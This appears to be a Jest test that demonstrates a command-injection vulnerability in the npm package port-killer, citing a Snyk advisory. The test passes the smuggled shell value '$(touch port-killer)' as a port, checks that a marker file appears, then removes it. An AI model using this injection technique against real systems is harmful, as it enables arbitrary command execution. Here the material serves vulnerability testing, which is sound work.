//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078533
test("Command Injection in port-killer", () => 
{
    const port_killer = require('port-killer');
	const fs = require('fs')
	const path = './port-killer'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    port_killer('$(touch port-killer)');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});